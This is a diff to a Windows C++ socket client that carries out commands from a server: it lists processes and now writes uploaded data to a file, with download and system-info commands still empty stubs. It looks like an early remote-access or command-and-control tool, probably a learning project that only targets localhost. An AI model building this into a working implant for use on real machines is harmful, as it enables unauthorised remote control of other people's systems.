@@ -4,6 +4,8 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <psapi.h>
+#include <sal.h>
+#include <fstream>
 
 #pragma comment (lib, "ws2_32.lib")
 
@@ -80,6 +82,20 @@ string list_procs(SOCKET sock) {
 	return output;
 }
 
+BOOL upload_file(string file_contents) {
+	fstream my_file;
+	my_file.open("uploaded_file.txt", ios::out);
+	if (!my_file) {
+		return FALSE;
+	} else {
+		cout << "File created successfully!";
+		my_file << file_contents;
+		my_file.close();
+		return TRUE;
+	}
+	return FALSE;
+}
+
 void main()
 {
 	string ipAddress = "127.0.0.1";			// IP Address of the server
@@ -134,10 +150,48 @@ void main()
 			string resp = string(buffer, 0, bytesReceived);
 			if (resp == string("list_procs")) {
 				string procs = list_procs(sock);
-				char *proc_list = (char*)malloc(procs.size() + 1);
+				_Post_ _Notnull_ char *proc_list = (char*)malloc(procs.size() + 1);
 				memcpy(proc_list, procs.c_str(), procs.size() + 1);
 				//proc_list = procs.c_str();
 				send(sock, proc_list, strlen(proc_list), 0);
+				free(proc_list);
+			}
+			if (resp == string("upload_file")) {
+				char upload_buffer[4096];
+				int uploadBytesReceived = recv(sock, upload_buffer, 4096, 0);
+				if (bytesReceived > 0) {
+					string upload_resp = string(upload_buffer, 0, uploadBytesReceived);
+					BOOL result = upload_file(upload_resp);
+					if (result) {
+						string succ = "Success! File has been uploaded";
+						cout << succ;
+						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
+						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
+						send(sock, succ_succ, strlen(succ_succ), 0);
+						free(succ_succ);
+					}
+					else {
+						string succ = "Failure! File has not been uploaded";
+						cout << succ;
+						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
+						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
+						send(sock, succ_succ, strlen(succ_succ), 0);
+						free(succ_succ);
+					}
+				} else {
+					string succ = "Failure! File has not been uploaded";
+					cout << succ;
+					_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
+					memcpy(succ_succ, succ.c_str(), succ.size() + 1);
+					send(sock, succ_succ, strlen(succ_succ), 0);
+					free(succ_succ);
+				}
+			}
+			if (resp == string("download_file")) {
+
+			}
+			if (resp == string("sys_info")) {
+
 			}
 			if (resp == string("exit")) {
 				running = FALSE;
@@ -145,7 +199,6 @@ void main()
 			cout << "SERVER> " << resp << endl;
 		}
 	}
-
 
 	// Close the socket
 	closesocket(sock);
